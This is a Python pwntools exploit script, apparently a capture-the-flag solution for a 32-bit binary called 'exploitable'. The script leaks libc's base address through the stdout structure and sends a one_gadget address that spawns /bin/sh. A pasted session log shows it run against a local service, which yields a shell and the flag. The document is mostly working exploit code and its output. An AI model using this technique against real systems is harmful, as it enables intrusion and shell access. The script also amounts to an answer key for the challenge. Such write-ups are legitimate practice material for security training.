#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from ctypes import c_int32
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

io = process("./exploitable", env = {"LD_PRELOAD": "./libc.so.6"})
libc = ELF("./libc.so.6")

libc.address = u32(io.recvn(4)) - libc.sym['_IO_2_1_stdout_']
success("libc.address -> {:#x}".format(libc.address))

#  gdb.attach(io, 'b *0x8048583')
one_gadget = 0x3a7ec
'''
0x3a7ec	execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

  [31] .got.plt          PROGBITS        001af000 1ae000 000030 04  WA  0   0  4

'''
io.sendline(str(c_int32(libc.address + one_gadget).value))

io.interactive()
io.close()

'''
exploitable@ubuntu:~$ python
Python 2.7.12 (default, Jul  1 2016, 15:12:24)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> from ctypes import c_int32
>>> io = remote("127.0.0.1", 9018)
[x] Opening connection to 127.0.0.1 on port 9018
[x] Opening connection to 127.0.0.1 on port 9018: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 9018: Done
>>> elf = ELF("./exploitable")
[*] '/home/exploitable/exploitable'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
>>> libc = elf.libc
[*] '/lib32/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
>>> libc.address = u32(io.recvn(4)) - libc.sym['_IO_2_1_stdout_']
>>> hex(libc.address)
'0xf755b000'
>>> one_gadget = 0x3a7ec
>>> io.sendline(str(c_int32(libc.address + one_gadget).value))
>>> io.interactive()
[*] Switching to interactive mode
ls
exploitable
exploitable.c
flag
intended_solution.txt
log
super.pl
cat flag
Thanks to geohot... I learned m4gic system ROP

'''
